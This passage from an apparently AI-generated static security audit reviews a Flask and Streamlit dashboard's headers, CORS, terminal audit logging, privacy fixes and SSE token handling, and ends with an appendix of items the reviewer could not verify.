    response.headers["Content-Security-Policy"] = "default-src 'self'; frame-ancestors 'none'"
    return response
```
Add `Strict-Transport-Security: max-age=63072000; includeSubDomains` only once TLS termination in front of this app is confirmed (setting HSTS without HTTPS in place can lock users out) — **Unable to verify** whether that's already the case; would need the production reverse-proxy/deployment config.
- **Effort:** Low (~15 min) for the header addition; Medium to tune the CSP directives against the dashboard's actual external resources (it loads Font Awesome from a CDN per earlier session context — `cdnjs.cloudflare.com` — which a `default-src 'self'` policy would need to explicitly allowlist).

### Finding H2 (already remediated, cross-referenced): `FLASK_DEBUG` + Flask-Limiter fail-open
- **Location:** `api/app.py` — see `error_handling_audit.md` Findings I1 and R2.
- **Assessment:** Not re-scored — both already fixed and covered by a direct unit test (`api/tests/test_app_factory.py`, added this session).

### Finding H3 (positive): CORS is scoped to an explicit allowlist
- **Location:** `api/app.py:63-64`, `api/extensions.py:13` — `CORS_ORIGINS` env var (default `http://localhost:8501`, real `.env` value `http://localhost:3000,http://localhost:8501,http://192.168.178.23:3000,http://192.168.178.23:8501`), never a wildcard `*`.
- **Importance: 1/10** — positive finding.

---

## 7. Data Flow & Privacy

### Finding P1 (positive): terminal command execution — the highest-privilege feature in the product — is fully audit-logged
- **Location:** `api/routes/terminal.py:59-64` (`_audit` helper), called at `:140` (session open), `:173` (session close), and critically `:214` — `_audit("terminal_command", session_id, {"command": command_text}, user_id)` — the **actual command text** is captured in `AuditLog`, not just the fact that a command ran.
- **Assessment:** Given this feature is, by design, unrestricted remote command execution gated only by role + device ownership (Finding I3 confirms no injection *escape* is needed because none is possible — the feature itself already grants full shell access), the audit trail is the correct and sufficient control here, and it's implemented well.
- **Importance: 1/10** — positive finding, cited because a feature this powerful deserves the credit when its compensating control is done right.

### Finding P2 (already remediated, cross-referenced): cross-session cache data leak
- **Location:** `dashboard/utils/cached_calls.py` — see `testing_audit.md`'s Remediation Status, bug #8, for the full writeup (all 13 `@st.cache_data`-wrapped functions ignored the caller's token for cache-key purposes, serving one user's dashboard data to every other user for up to 120 seconds).
- **Assessment:** This is, by a wide margin, the most severe *data flow/privacy* finding surfaced across all five audits this session. It's fixed and reverified — flagged here only so this report's "Data Flow & Privacy" section isn't misleadingly thin.

### Finding P3 (positive): GDPR export/delete are implemented and tested
- **Location:** `api/routes/admin.py` — `GET /users/<id>/gdpr-export` (Art. 20), `DELETE /users/<id>/gdpr-delete` (Art. 17), both covered by `api/tests/test_admin.py` (added this session — `TestGdprExport`, `TestGdprDelete`, including a regression test that the anonymization actually scrubs `email`/`password_hash`/`full_name`).
- **Importance: 1/10** — positive finding.

### Finding P4: SSE token-in-URL — **already a documented, deliberate tradeoff**, noted for completeness
- **Location:** `api/routes/events.py:34-45` (`?token=` query param, required because `EventSource` cannot set custom headers)
- **Assessment:** Query-string tokens can land in server access logs, proxy logs, and browser history. This is not a newly-discovered gap — the code's own docstring acknowledges the constraint, and `error_handling_audit.md` Finding I6 already fixed the specific information-leak this endpoint had (a raw exception message on invalid tokens). Not re-scored; noted because a security audit of this category should not omit it entirely.
- **Unable to verify:** whether the token's short lifetime (a normal access token's expiry, not SSE-specific) sufficiently bounds the exposure window if it does land in a log — would need to know the configured `JWT_ACCESS_TOKEN_EXPIRES` value, which is env-configured and not hardcoded in source.

---

## Appendix — Items Marked "Unable to Verify"

| Item | What would confirm it |
|---|---|
| Path traversal in `routes/update.py`/`routes/reports.py`/avatar upload (Finding I4) | Line-by-line read of every filesystem path built from a request parameter, or a dedicated `../`-payload test |
| Exact CVE identifiers behind the 49+6 dependency advisories (Finding D1) | A live `pip-audit`/`npm audit` run in an environment with network access to the advisory databases |
| Whether TLS termination is in place in front of the production deployment (relevant to Finding H1's HSTS recommendation, and to Finding C2's `JWT_COOKIE_SECURE`) | The production reverse-proxy/load-balancer config, which lives outside this repo |
| Whether `JWT_ACCESS_TOKEN_EXPIRES` is short enough to bound Finding P4's log-exposure window | The deployed `.env`'s actual value (not hardcoded in source) |

---

*Report generated by static codebase review — Claude Code, 2026-09-25.*
